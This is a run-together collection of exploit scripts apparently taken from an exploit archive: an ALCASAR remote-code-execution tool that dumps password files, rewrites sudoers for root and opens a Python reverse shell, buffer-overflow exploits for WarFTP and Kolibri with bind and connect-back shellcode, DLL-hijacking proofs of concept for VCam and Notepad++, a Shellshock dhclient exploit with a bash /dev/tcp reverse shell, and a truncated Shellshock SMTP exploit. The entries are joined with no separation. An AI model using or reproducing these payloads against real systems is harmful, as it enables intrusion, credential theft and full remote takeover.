# Or to create or overwrite files as root (create a cron job, edit /etc/sudoers, etc.):
#
#   echo cHduZWQK | sudo /usr/bin/openssl base64 -d -out /etc/cron.d/pwned
#
# In this exploit, I choose to modify the "sudoers" file.
# 
# Note: this vulnerability has been discovered in less than 30 seconds.
# Others vulnerabilities are still present. This code has never been audited...
# The PHP code is dreadful and needs to be rewritten from scratch.
#
# Example (post-auth) in file acc/admin/activity.php:
#
#   if (isset($_POST['action'])){
#       switch ($_POST['action']){
#            case 'user_disconnect' :
#               exec ("sudo /usr/sbin/chilli_query logout $_POST[mac_addr]");
#
#
# This is not a responsible disclosure coz' I have no sense of ethics and I couldn't care less.
#
#
# % python alcasar-2.8_rce.py alcasar.localdomain "alcasar-version.sh"
#
# [+] Hello, first here are some passwords for you:
# Password to protect the boot menu (GRUB) : cV9eEz1g
# Name and password of Mysql/mariadb administrator : root / FvYPr7b3
# Name and password of Mysql/mariadb user : radius / oRNln64j
# Shared secret between the script 'intercept.php' and coova-chilli : b9Rj34jz
# Shared secret between coova-chilli and FreeRadius : 7tIrnkJu
#
# root:$2a$08$Aw4yIxQIUJ0taDjiXKSRYu6zZB5eUcbZ4445vo1157AdeGSfe1XuC:16319:0:99999:7:::
#
# [...]
#
# admin:alcasar.localdomain:49b8642b4646a4afa38cda065f76ce0e
#
# username        value
# user    $1$passwd$qr0Ajhr12fZ475a2qAZ.H.
#
# [-] whoami (should be apache):
# uid=495(apache) gid=492(apache) groups=492(apache)
#
# [+] On the way to the uid 0...
# [-] Got root?
# uid=0(root) gid=0(root) groups=0(root)
#
# [+] Your command Sir:
# The Running version (2.8) is up to date
#
#
####

import sys, os, re, httplib

class PWN_Alcasar:

    def __init__(self, host):
        self.host = host
        self.root = False

    def exec_cmd(self, cmd, output=False):
        tag = os.urandom(4).encode('hex')

        cmd = 'bash -c "%s" 2>&1' % cmd.replace('"', '\\"')
        if self.root:
            cmd = 'sudo %s' % cmd

        headers = {
            'host' : 'aAaAa index.php;echo %s;echo %s|base64 -d -w0|sh|base64 -w0;#' % (tag, cmd.encode('base64').replace('\n',''))
        }

        c = httplib.HTTPConnection(self.host)
        c.request('GET', '/index.php', '', headers)
        r = c.getresponse()
        data = r.read()
        c.close()

        if data.find(tag) != -1:
            m = re.search(r'%s, (.*)\s</div>' % tag, data)
            if m:
                data = m.group(1).decode('base64')
                if output:
                    print data
                return data
        return None

    def read_file(self, filepath, output=True):
        return self.exec_cmd('sudo openssl base64 -in %s -A|base64 -d' % filepath, output=output)

    def read_passwords(self):
        self.read_file('/root/ALCASAR-passwords.txt')
        self.read_file('/etc/shadow')
        self.read_file('/usr/local/etc/digest/key_all')
        self.read_file('/usr/local/etc/digest/key_admin')
        self.read_file('/usr/local/etc/digest/key_backup')
        self.read_file('/usr/local/etc/digest/key_manager')
        self.read_file('/usr/local/etc/digest/key_only_admin')
        self.read_file('/usr/local/etc/digest/key_only_backup')
        self.read_file('/usr/local/etc/digest/key_only_manager')
        alcasar_mysql = self.read_file('/usr/local/sbin/alcasar-mysql.sh', output=False)
        if alcasar_mysql:
            m = re.search(r'radiuspwd="(.*)"', alcasar_mysql)
            if m:
                radiuspwd = m.group(1)
                sql = 'SELECT username,value FROM radcheck WHERE attribute like \'%%password%%\''
                self.exec_cmd('mysql -uradius -p\"%s\" radius -e "%s"' % (radiuspwd, sql), output=True)

    def edit_sudoers(self):
        self.exec_cmd('sudo openssl base64 -in /etc/sudoers -out /tmp/sudoers.b64')
        self.exec_cmd('openssl base64 -d -in /tmp/sudoers.b64 -out /tmp/sudoers')
        self.exec_cmd('sed -i s/BL,NF/BL,ALL,NF/g /tmp/sudoers')
        self.exec_cmd('sudo openssl base64 -in /tmp/sudoers -out /tmp/sudoers.b64')
        self.exec_cmd('sudo openssl base64 -d -in /tmp/sudoers.b64 -out /etc/sudoers')
        self.exec_cmd('sudo rm -f /tmp/sudoers*')
        self.root = True

    def reverse_shell(self, rip, rport='80'):
        payload = 'import socket,subprocess,os;'
        payload += 's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
        payload += 's.connect((\'%s\',%s));' % (rip, rport)
        payload += 'os.dup2(s.fileno(),0);'
        payload += 'os.dup2(s.fileno(),1);'
        payload += 'os.dup2(s.fileno(),2);'
        payload += 'p=subprocess.call([\'/bin/sh\',\'-i\']);'
        return self.exec_cmd('python -c "%s"' % payload)

def usage():
    print 'Usage: %s host command (ip) (port)' % sys.argv[0]
    print '       "command" can be a shell command or "reverseshell"'
    sys.exit(0)
 
if __name__ == '__main__':

    if len(sys.argv) < 3:
        usage()
 
    cmd = sys.argv[2]
    if cmd == 'reverseshell':
        if len(sys.argv) < 5:
            print '[!] Need IP and port for the reverse shell...'
            sys.exit(0)
        rip = sys.argv[3]
        rport = sys.argv[4] # 80 is a good one...

    exploit = PWN_Alcasar(sys.argv[1])
    print '[+] Hello, first here are some passwords for you:'
    exploit.read_passwords()
    print '[-] whoami (should be apache):'
    exploit.exec_cmd('id', output=True)
    print '[+] On the way to the uid 0...'
    exploit.edit_sudoers()
    print '[-] Got root?'
    exploit.exec_cmd('id', output=True)
    if cmd == 'reverseshell':
        print '[+] You should now have a shell on %s:%s' % (rip, rport)
        exploit.reverse_shell(rip, rport)
    else:
        print '[+] Your command Sir:'
        exploit.exec_cmd(cmd, output=True)
    sys.exit(1)source: http://www.securityfocus.com/bid/43356/info

Basic Web Server is prone to a directory-traversal vulnerability and a denial-of-service vulnerability.

Exploiting these issues will allow attackers to obtain sensitive information or cause denial-of-service conditions.

Basic Web Server 1.0 is vulnerable; other versions may also be affected. 

http://www.example.com/?../../../../../../../../../../windows/win.

import socket

host = 'localhost'
port = 80

include_file = True
complete_path = True

try:
    for i in range(0, 1024):

        for x in range(0, 8):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            s.settimeout(2)
            s.send('GET http:/// HTTP/1.1\r\n'
                   'Host: ' + host + '\r\n\r\n')
            print '.',

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.settimeout(2)
        s.send('GET / HTTP/1.1\r\n'
               'Host: ' + host + '\r\n\r\n')
        s.recv(8192)

        print 'response received'
except:
    print 'error contacting server'
#!/usr/bin/python
# Remote exploit for WarFTP 1.65. Tested on Windows 2000 server SP4 inside
# VMware. A trivially exploitable stack overflow is present in WarFTP which
# can be triggered by sending a long username (>480 bytes) along with the USER
# ftp command. Maybe other commands like PASS might also be affected. I did
# not check though. This exploit binds shell on TCP port 4444 and then
# connects to it
#
# Author shall not bear any responsibility for any screw ups
# Winny Thomas :-)

import os
import sys
import time
import socket
import struct

# alphanumeric portbind shellcode from metasploit
shellcode  = "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
shellcode += "\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
shellcode += "\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
shellcode += "\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
shellcode += "\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x36\x4b\x4e"
shellcode += "\x4d\x34\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x46\x4b\x58"
shellcode += "\x4e\x56\x46\x42\x46\x42\x4b\x58\x45\x54\x4e\x53\x4b\x48\x4e\x57"
shellcode += "\x45\x30\x4a\x47\x41\x30\x4f\x4e\x4b\x48\x4f\x44\x4a\x51\x4b\x38"
shellcode += "\x4f\x55\x42\x32\x41\x50\x4b\x4e\x49\x44\x4b\x58\x46\x33\x4b\x58"
shellcode += "\x41\x30\x50\x4e\x41\x43\x42\x4c\x49\x49\x4e\x4a\x46\x48\x42\x4c"
shellcode += "\x46\x37\x47\x30\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e"
shellcode += "\x46\x4f\x4b\x53\x46\x35\x46\x52\x4a\x42\x45\x57\x45\x4e\x4b\x48"
shellcode += "\x4f\x45\x46\x52\x41\x30\x4b\x4e\x48\x46\x4b\x38\x4e\x50\x4b\x54"
shellcode += "\x4b\x48\x4f\x45\x4e\x41\x41\x30\x4b\x4e\x43\x30\x4e\x32\x4b\x58"
shellcode += "\x49\x48\x4e\x36\x46\x42\x4e\x41\x41\x56\x43\x4c\x41\x53\x4b\x4d"
shellcode += "\x46\x56\x4b\x38\x43\x54\x42\x43\x4b\x58\x42\x44\x4e\x30\x4b\x38"
shellcode += "\x42\x47\x4e\x41\x4d\x4a\x4b\x58\x42\x44\x4a\x30\x50\x55\x4a\x56"
shellcode += "\x50\x48\x50\x34\x50\x30\x4e\x4e\x42\x45\x4f\x4f\x48\x4d\x48\x36"
shellcode += "\x43\x45\x48\x56\x4a\x46\x43\x53\x44\x33\x4a\x46\x47\x37\x43\x57"
shellcode += "\x44\x33\x4f\x35\x46\x35\x4f\x4f\x42\x4d\x4a\x36\x4b\x4c\x4d\x4e"
shellcode += "\x4e\x4f\x4b\x53\x42\x45\x4f\x4f\x48\x4d\x4f\x35\x49\x38\x45\x4e"
shellcode += "\x48\x46\x41\x58\x4d\x4e\x4a\x30\x44\x30\x45\x35\x4c\x36\x44\x30"
shellcode += "\x4f\x4f\x42\x4d\x4a\x46\x49\x4d\x49\x50\x45\x4f\x4d\x4a\x47\x35"
shellcode += "\x4f\x4f\x48\x4d\x43\x35\x43\x45\x43\x55\x43\x45\x43\x35\x43\x34"
shellcode += "\x43\x55\x43\x34\x43\x45\x4f\x4f\x42\x4d\x48\x46\x4a\x36\x41\x41"
shellcode += "\x4e\x45\x48\x36\x43\x45\x49\x58\x41\x4e\x45\x39\x4a\x56\x46\x4a"
shellcode += "\x4c\x31\x42\x37\x47\x4c\x47\x45\x4f\x4f\x48\x4d\x4c\x46\x42\x31"
shellcode += "\x41\x55\x45\x55\x4f\x4f\x42\x4d\x4a\x36\x46\x4a\x4d\x4a\x50\x42"
shellcode += "\x49\x4e\x47\x45\x4f\x4f\x48\x4d\x43\x55\x45\x35\x4f\x4f\x42\x4d"
shellcode += "\x4a\x36\x45\x4e\x49\x54\x48\x58\x49\x44\x47\x55\x4f\x4f\x48\x4d"
shellcode += "\x42\x55\x46\x35\x46\x35\x45\x35\x4f\x4f\x42\x4d\x43\x39\x4a\x56"
shellcode += "\x47\x4e\x49\x47\x48\x4c\x49\x37\x47\x45\x4f\x4f\x48\x4d\x45\x45"
shellcode += "\x4f\x4f\x42\x4d\x48\x46\x4c\x36\x46\x56\x48\x36\x4a\x46\x43\x46"
shellcode += "\x4d\x46\x49\x58\x45\x4e\x4c\x56\x42\x35\x49\x55\x49\x52\x4e\x4c"
shellcode += "\x49\x38\x47\x4e\x4c\x56\x46\x54\x49\x58\x44\x4e\x41\x53\x42\x4c"
shellcode += "\x43\x4f\x4c\x4a\x50\x4f\x44\x54\x4d\x52\x50\x4f\x44\x34\x4e\x32"
shellcode += "\x43\x49\x4d\x48\x4c\x47\x4a\x33\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x36"
shellcode += "\x44\x47\x50\x4f\x43\x4b\x48\x41\x4f\x4f\x45\x57\x46\x34\x4f\x4f"
shellcode += "\x48\x4d\x4b\x45\x47\x55\x44\x55\x41\x45\x41\x35\x41\x55\x4c\x36"
shellcode += "\x41\x30\x41\x35\x41\x55\x45\x45\x41\x45\x4f\x4f\x42\x4d\x4a\x56"
shellcode += "\x4d\x4a\x49\x4d\x45\x30\x50\x4c\x43\x35\x4f\x4f\x48\x4d\x4c\x56"
shellcode += "\x4f\x4f\x4f\x4f\x47\x33\x4f\x4f\x42\x4d\x4b\x38\x47\x55\x4e\x4f"
shellcode += "\x43\x48\x46\x4c\x46\x36\x4f\x4f\x48\x4d\x44\x55\x4f\x4f\x42\x4d"
shellcode += "\x4a\x46\x42\x4f\x4c\x48\x46\x50\x4f\x45\x43\x55\x4f\x4f\x48\x4d"
shellcode += "\x4f\x4f\x42\x4d\x5a\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

def ConnectRemoteShell(target):
       connect = "/usr/bin/telnet " + target + " 4444"
       os.system(connect)

def ExploitFTP(target):
       sockAddr = (target, 21)
       tsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       tsock.connect(sockAddr)
       response = tsock.recv(1024)

       # At the time of overflow EBP points to our shellcode
       payload = "USER "
       payload += "A" * 485
       # Point of EIP overwrite. Address of 'call ebp' from user32.dll SP4.
       payload += struct.pack("<L", 0x77E14709)
       payload += "\x90" * 100
       payload += shellcode
       payload += "\r\n"
       tsock.send(payload)

if __name__ == '__main__':
       try:
               target = sys.argv[1]
       except IndexError:
               print 'Usage: %s <target>' % sys.argv[0]
               sys.exit(-1)

       ExploitFTP(target)
       time.sleep(2)
       ConnectRemoteShell(target)

# milw0rm.com [2007-03-14]
source: http://www.securityfocus.com/bid/44051/info

e2eSoft VCam is prone to a vulnerability that lets attackers execute arbitrary code.

An attacker can exploit this issue by enticing a legitimate user to use the vulnerable application to open a file from a network share location that contains a specially crafted Dynamic Link Library (DLL) file. 

===================================================
e2eSoft VCam DLL Hijacking Exploit (ippopencv100.dll & ippcv-6.1.dll )

===================================================

/*
#e2eSoft VCam DLL Hijacking Exploit (ippopencv100.dll & ippcv-6.1.dll )

#Author    :   anT!-Tr0J4n

#Greetz    :   Dev-PoinT.com ~ inj3ct0r.com  ~ All Dev-poinT members and my friends

#Email      :   D3v-PoinT[at]hotmail[d0t]com & C1EH[at]Hotmail[d0t]com

#Software :   http://www.e2esoft.cn/vcam/

#Tested on:   Windows? XP sp3

#Home     :   www.Dev-PoinT.com


==========================
How  TO use : Compile and rename to  ippopencv100.dll & ippcv-6.1.dll , create a file in the same dir with one of the following extensions.

 check the result > Hack3d    
         
==========================

# ippopencv100.dll & ippcv-6.1.dll(code)
*/
 
#include "stdafx.h"
 
void init() {
MessageBox(NULL,"anT!-Tr0J4n", "Hack3d",0x00000003);
}
 
 
BOOL APIENTRY DllMain( HANDLE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
 )
{
    switch (ul_reason_for_call)
{
case DLL_PROCESS_ATTACH:
 init();break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
 case DLL_PROCESS_DETACH:
break;
    }
    return TRUE;
}source: http://www.securityfocus.com/bid/44052/info

Notepad++ is prone to a vulnerability that lets attackers execute arbitrary code.

An attacker can exploit this issue by enticing a legitimate user to use the vulnerable application to open a file from a network share location that contains a specially crafted Dynamic Link Library (DLL) file.

Notepad++ 5.8.2 is vulnerable; other versions may also be affected.

/*
#Notepad++ 5.8.2 DLL Hijacking Exploit (libtidy.dll)

#Author    :   anT!-Tr0J4n

#Greetz    :   Dev-PoinT.com ~ inj3ct0r.com  ~ All Dev-poinT members and my friends

#Email      :   D3v-PoinT[at]hotmail[d0t]com & C1EH[at]Hotmail[d0t]com

#Software :  http://notepad-plus-plus.org/

#Tested on:   Windows? XP sp3

#Home     :   www.Dev-PoinT.com


==========================
How  TO use : Compile and rename to  libtidy.dll , create a file in the same dir with one of the following extensions.

 check the result > Hack3d    
         
==========================

# libtidy.dll(code)
*/
 
#include "stdafx.h"
 
void init() {
MessageBox(NULL,"Your System 0wn3d BY anT!-Tr0J4n", "anT!-Tr0J4n",0x00000003);
}
 
 
BOOL APIENTRY DllMain( HANDLE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
 )
{
    switch (ul_reason_for_call)
{
case DLL_PROCESS_ATTACH:
 init();break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
 case DLL_PROCESS_DETACH:
break;
    }
    return TRUE;
}#!/bin/python
import socket, sys, re

############################################################################################################
# Exploit Title: Kolibri POST Buffer overflow with EMET 5.0 and EMET 4.1 Partial Bypass
# Date: September 30th 2014
# Author: tekwizz123
# Vendor Homepage: http://www.senkas.com
# Software Download: http://www.senkas.com/kolibri/download.php
# Version: 2.0
# Tested on: Windows 7 32 bit, Windows 7 64 bit, Windows XP SP3
# CVE-ID: CVE-2014-5289
#
# This exploit will bypass all protections in EMET 5.0 and 4.1 but DEP.
#
# If you have any questions about the exploit, send a message to @tekwizz123 and I'll try help out.
#
# You may modify this exploit as you like for whatever purposes you like so long as my name (tekwizz123)
# appears as the original author of this exploit.
###########################################################################################################

# Basic check to see if we have the arguments we need
if len(sys.argv) < 6:
    print "Usage: " + sys.argv[0] + " *target ip* *target port* *ip to connect back to* *port to connect back to* *target*"
    print "Targets: "
    print "1. XP SP2 32 bit"
    print "2. XP SP3 32 bit"
    print "3. Windows Vista and Later 32 bit or 64 bit"
    exit(1)



# Set source ip and port and destination ip and port
targetip = sys.argv[1]
targetport = int(sys.argv[2])
localhost = sys.argv[3]
localport = int(sys.argv[4])


# Set the version of the remote machine so we can craft the correct exploit for it
target = int(sys.argv[5])


# Check if the version was valid or not
if (target != 1 and target != 2 and target !=3):
	print "Error: Target was not valid"



# Define our check to see if the server is vulnerable
def check():
	handle = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print "Checking if target is vulnerable....."
	handle.connect((targetip, targetport))
	handle.send("GET / HTTP/1.1\r\n")
	resp = handle.recv(1024)
	handle.close()

	if re.search("server: kolibri\-2\.0", resp):
		print "\nTarget is vulnerable\n"
	else:
		print "\nTarget is not vulnerable\n"
		exit(0) # Exit the program before we continue

# And call it to check if the server is vulnerable
check()



# Define the code for the custom close socket loop
def addBufCloseSocketASM(buf):
	#CloseSocket Call Loop. 
	"""This is very important as without this code, if we terminate the program for some reason,
	the program doesn't free up the sockets it uses to listen for the connections to the server.
	Therefore, we check from 0 to about 205 ish (I think, can't remember the exact number) and close all
	of these sockets one by one. Since you can only close a socket associated with the program from which
	you call the CloseSocket call, this will not affect other applications, and thus is a nice solution."""
	buf += "\xBE\xA1\xF4\x6C\x01"
	buf += "\x81\xEE\x01\x01\x01\x01"
	buf += "\x8B\x36"
	buf += "\x33\xFF"
	buf += "\x33\xDB"
	buf += "\x83\xC3\x50" * 7
	buf += "\x3B\xFB"
	buf += "\x7F\x06"
	buf += "\x57"
	buf += "\xFF\xD6"
	buf += "\x47" # Increment the flipping counter before we loop around again with next instruciton.
	buf += "\xEB\xF6"
	
	return buf

def addSocketASM(buf):
	#Socket call to set up a new socket, on working one this is is WS2_32.WSASocketA?
	buf += "\xBB\x91\xF4\x6C\x01"
	buf += "\x81\xEB\x01\x01\x01\x01"
	buf += "\x8B\x1B"
	if target == 3:
		buf += "\x81\xC3\x79\x8E\x01\x01"
		buf += "\x81\xEB\x01\x01\x01\x01"
	if target == 2:
		buf += "\x81\xC3\xEB\x09\x11\x10"
		buf += "\x81\xEB\xD6\xE8\x10\x10"
	if target == 1:
		buf += "\x81\xC3\x95\x77\x01\x01"
		buf += "\x81\xEB\x79\x56\x01\x01"
	buf += "\x33\xC9"
	buf += "\x51\x51\x51\x51"
	buf += "\x41\x51\x41\x51"
	buf += "\xFF\xD3"

	return buf

def addConnectCallASM(buf):
	#Connect call
	buf += "\xBB\xA5\xF4\x6C\x01\x81\xEB\x01\x01\x01\x01\x8B\x1B\x68"

	# Set the IP to connect back to within the shellcode, thanks to http://stackoverflow.com/questions/12638408/decorating-hex-function-to-pad-zeros
	# this should now work with all IP addresses.
	hostString = str(localhost).split(".")
	buf += "{0:#0{1}x}".format(int(hostString[0]),4)[2:4].decode('hex')
	buf += "{0:#0{1}x}".format(int(hostString[1]),4)[2:4].decode('hex')
	buf += "{0:#0{1}x}".format(int(hostString[2]),4)[2:4].decode('hex')
	buf += "{0:#0{1}x}".format(int(hostString[3]),4)[2:4].decode('hex')

	# Some static bytes in the shellcode
	buf += "\xB9\x02\x01"

	# The the port to connect back on in the shellcode
	hexPort = hex(localport)
	buf += hexPort[2:4].decode('hex')
	buf += hexPort[4:].decode('hex')

	# Finish the last of the Connect call shellcode
	buf += "\xFE\xCD\x51\x8B\xCC\x8B\xF0\x33\xC0\xB0\x16\x50\x51\x56\xFF\xD3"

	return buf

def addExitProcessASM(buf):
	#ExitProcess Call
	buf += "\xBF\x15\xEE\x6C\x01\x81\xEF\x01\x01\x01\x01\x8B\x3F\xFF\xD7"
	return buf



##########################################################################################################################

# This section is responsible for doing a standard stack overflow against XP targets to get around SEHOP issues not present
# with the Windows 7 version for some reason.

##########################################################################################################################
if (target == 1 or target == 2):
	buf = ""

	# Add the close socket assembly to the buffer variable
	buf = addBufCloseSocketASM(buf)

	# Add the socket assembly to open up a new socket
	buf = addSocketASM(buf)

	# Add the assembly to connect back to our host
	buf = addConnectCallASM(buf)
	

	#CreateProcessA call
	buf += "\x33\xC9\xB1\x54\x2B\xE1\x8B\xFC\x57\x33\xC0\xF3\xAA\x5F\xC6\x07\x44\xFE\x47\x2D\x57\x8B\xC6\x8D\x7F\x38\xAB\xAB\xAB\x5F\x33\xC0\x8D\x77\x44\xB9\x64\x6E\x65\x01\x81\xE9\x01\x01\x01\x01\x51\x8B\xCC\x56\x57\x50\x50\xBA\x10\x10\x10\x18\x81\xEA\x10\x10\x10\x10\x52\x40\x50\x48\x50\x50\x51\x50\xBE\xFD\xED\x6C\x01\x81\xEE\x01\x01\x01\x01\x8B\x36\xFF\xD6"
	
	# Add ExitProcess shellcode
	buf = addExitProcessASM(buf)

	overflow = "A" * 515
	if target == 2:
		overflow += "\x7B\x46\x86\x7C" #7C86467B on Windows XP SP3 = JMP ESP
	if target == 1:
		overflow += "\xED\x1E\x94\x7C" #7C941EED on Windows XP SP2 = JMP ESP
	overflow += buf	





########################################################################################################

# This section of the exploit deals with the Windows 7 version of the exploit

########################################################################################################
if (target == 3):

	# Start defining our shellcode into the buf variable, starting with the tag for our egghunter:
	buf =  "\x43\x44\x44\x45\x43\x44\x44\x45"

	# Add the close socket assembly to the buffer variable
	buf = addBufCloseSocketASM(buf)

	#Socket call to set up a new socket, on working one this is is WS2_32.WSASocketA?
	buf = addSocketASM(buf)

	# Add the assembly to connect back to our host
	buf = addConnectCallASM(buf)

	#CreateProcessA call
	buf += "\x33\xC9\xB1\x54\x2B\xE1\x8B\xFC\x57\x33\xC0\xF3\xAA\x5F\xC6\x07\x44\xFE\x47\x2D\x57\x8B\xC6\x8D\x7F\x38\xAB\xAB\xAB\x5F\x33\xC0\x8D\x77\x44\xB9\x64\x6E\x65\x01\x81\xE9\x01\x01\x01\x01\x51\x8B\xCC\x56\x57\x50\x50\xBA\x10\x10\x10\x18\x81\xEA\x10\x10\x10\x10\x52\x40\x50\x48\x50\x50\x51\x50\xBF\xFD\xED\x6C\x01\x81\xEF\x01\x01\x01\x01\x8B\x3F\xFF\xD7"

	
	# Add ExitProcess shellcode
	buf = addExitProcessASM(buf)

	
	# The legendary WoW64 egghunter created by Lincoln. Greetz mate, you've done a brilliant job with this :)
	# One should also note, if the target has EAF enabled, this egghunter will take longer to run
	egghunter = (
	"\x33\xD2" # XOR EDX, EDX to start the search from the beginning of memory, a la 00000000.
	"\x66\x8c\xcb\x80\xfb\x23\x75\x08\x31\xdb\x53\x53\x53\x53\xb3\xc0"
	"\x66\x81\xca\xff\x0f\x42\x52\x80\xfb\xc0\x74\x19\x6a\x02\x58\xcd"
	"\x2e\x5a\x3c\x05\x74\xea\xb8"
	"\x43\x44\x44\x45"  # tag to search for
	"\x89\xd7\xaf\x75\xe5\xaf\x75\xe2\xff\xe7\x6a\x26\x58\x31\xc9\x89"
	"\xe2\x64\xff\x13\x5e\x5a\xeb\xdf\x90\x90")

	overflow = "A" * 12
	overflow += "A" * (790 - len(overflow) - len(egghunter))
	overflow += egghunter
	overflow += "A" * 2
	overflow += "\xEB\x99" # NSEH overwrite
	overflow += "\xD1\x87\x44" #SEH overwrite 004487D1 aka xor pop pop ret from the binary itself.



# Define our buffer for the exploit

buffer = "POST /" + overflow + " HTTP/1.1\r\n"
buffer += "User-Agent: Wget/1.13.4\r\n"
buffer += "Host: " + buf + "\r\n"# change this!
buffer += "Accept: */*\r\n"
buffer += "Connection: Keep-Alive\r\n"
buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
buffer += "Content-Length: 4"
buffer += "\r\n\r\n"
buffer += "licenseID=string&content=string¶msXML=string"


# Set up the handle and connect to the target, the send the buffer and close the connection
handle = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "Connecting to the target......"
handle.connect((targetip, targetport))
print "Sending evil buffer....."
handle.send(buffer)
handle.close()

# Print out details about the expected waiting time for the egghunter to work.
print "\nWe are now done."
print "If targeting XP, your shell will be instant"
print "If targeting Windows Vista and later, you will recieve your shell within 6 seconds if the target has not enabled EAF protection"
print "Otherwise, if the target has enabled EAF protection, expect your shell within 35 seconds."
#!/usr/bin/python
# Exploit Title: dhclient shellshocker
# Google Dork: n/a
# Date: 10/1/14
# Exploit Author: @0x00string
# Vendor Homepage: gnu.org
# Software Link: http://ftp.gnu.org/gnu/bash/bash-4.3.tar.gz
# Version: 4.3.11
# Tested on: Ubuntu 14.04.1
# CVE : CVE-2014-6277,CVE-2014-6278,CVE-2014-7169,CVE-2014-7186,CVE-2014-7187
#  ______        ______  ______                 _                  
# / __   |      / __   |/ __   |     _         (_)                 
#| | //| |_   _| | //| | | //| | ___| |_   ____ _ ____   ____  ___ 
#| |// | ( \ / ) |// | | |// | |/___)  _) / ___) |  _ \ / _  |/___)
#|  /__| |) X (|  /__| |  /__| |___ | |__| |   | | | | ( ( | |___ |
# \_____/(_/ \_)\_____/ \_____/(___/ \___)_|   |_|_| |_|\_|| (___/ 
#                                                      (_____|     
#     _ _           _ _                  
#    | | |         | (_)            _    
#  _ | | | _   ____| |_  ____ ____ | |_  
# / || | || \ / ___) | |/ _  )  _ \|  _) 
#( (_| | | | ( (___| | ( (/ /| | | | |__ 
# \____|_| |_|\____)_|_|\____)_| |_|\___)                                        
#
#      _           _ _      _                 _                
#     | |         | | |    | |               | |               
#  ___| | _   ____| | | ___| | _   ___   ____| |  _ ____  ____ 
# /___) || \ / _  ) | |/___) || \ / _ \ / ___) | / ) _  )/ ___)
#|___ | | | ( (/ /| | |___ | | | | |_| ( (___| |< ( (/ /| |    
#(___/|_| |_|\____)_|_(___/|_| |_|\___/ \____)_| \_)____)_|    

# this buddy listens for clients performing a DISCOVER, a later version will exploit periodic REQUESTs, which can sometimes be prompted by causing IP conflicts
# once a broadcast DISCOVER packet has been detected, the XID, MAC and requested IP are pulled from the pack and a corresponding OFFER and ACK are generated and pushed out
# The client is expected to reject the offer in preference of their known DHCP server, but will still process the packet, triggering the vulnerability.
# can use option 114, 56 or 61, though is hardcoded to use 114 as this is merely a quick and dirty example.

import socket, struct
def HexToByte( hexStr ): 
    b = []
    h = ''.join( h.split(" ") )
    for i in range(0, len(h), 2):
        b.append( chr( int (h[i:i+2], 16 ) ) )
    return ''.join( b )

rport = 68
lport = 67

bsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bsock.bind(("<broadcast>", lport))

while True:

	OP = "72" # 56, Message - RFC 1533,2132. 61, Client-identifier - RFC 1533,2132,4361 or 114, URL - RFC 3679 are currently known to work, here we use 114
	URL = "() { :;}; bash -i >& /dev/tcp/10.0.0.1/1337 0>&1".encode("hex")
	URLLEN = chr(len(URL) / 2).encode("hex")
	END = "03040a000001ff"
	broadcast_get, (bcrhost, rport) = bsock.recvfrom(2048)
	hexip = broadcast_get[245:249]
	rhost = str(ord(hexip[0])) + "." + str(ord(hexip[1])) + "." + str(ord(hexip[2])) + "." + str(ord(hexip[3]))
	XID = broadcast_get[4:8].encode("hex")
	chaddr = broadcast_get[29:34].encode("hex")
	print "[+]\tgot broadcast with XID " + XID + " requesting IP " + rhost + "\n"
	OFFER = "02010600" + XID + "00000000000000000a0000430a0000010000000000" + chaddr + "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006382536335010236040a000001330400000e103a04000007083b0400000c4e0104ffffff001c040a0000ff06040a0000010f034c4f4c0c076578616d706c65" + OP + URLLEN + URL + END
	OFFER_BYTES = HexToByte(OFFER)
	ACK = "02010600" + XID + "00000000000000000a0000430a0000010000000000" + chaddr + "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006382536335010536040a000001330400000e103a04000007083b0400000c4e0104ffffff001c040a0000ff06040a0000010f034c4f4c0c076578616d706c65" + OP + URLLEN + URL + END
	ACK_BYTES = HexToByte(ACK)
	print "[+]\tsending evil offer\n"
	sock.sendto(OFFER_BYTES, (rhost, rport))
	broadcast_get2 = bsock.recvfrom(2048)
	print "[+]\tassuming request was received, sending ACK\n"
	sock.sendto(ACK_BYTES, (rhost, rport))

#!/bin/python
# Exploit Title:  Shellshock SMTP Exploit
# Date: 10/3/2014
# Exploit Author: fattymcwopr
# Vendor Homepage: gnu.org
# Software Link: http://ftp.gnu.org/gnu/bash/
# Version: 4.2.x < 4.2.48
# Tested on: Debian 7 (postfix smtp server w/procmail)
# CVE : 2014-6271

from socket import *
import sys

def usage():
    print "shellshock_smtp.py <target> <command>"

argc = len(sys.argv)
if(argc < 3 or argc > 3):
    usage()
    sys.exit(0)

rport = 25
rhost = sys.argv[1]
cmd = sys.argv[2]

headers = ([
    "To",
    "References",
    "Cc",
    "Bcc",
    "From",
    "Subject",
